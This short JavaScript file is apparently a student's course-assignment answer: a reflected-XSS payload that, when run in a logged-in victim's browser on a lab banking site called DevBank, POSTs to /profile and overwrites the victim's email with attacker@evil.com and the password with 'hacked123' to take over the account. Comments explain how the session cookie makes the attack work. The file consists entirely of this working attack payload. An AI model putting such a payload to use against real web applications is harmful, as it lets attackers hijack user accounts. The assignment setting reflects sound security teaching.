// FIT5003 A2 - Part B.2 reflected-XSS account-takeover payload
// Student: 36409251
// Runs in a logged-in victim's browser (same origin as DevBank), so the
// session cookie is sent automatically with this request. It overwrites the
// victim's email and password, giving the attacker control of the account.
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&password=hacked123'
}).then(function () {
  console.log('[payload] account takeover sent');
});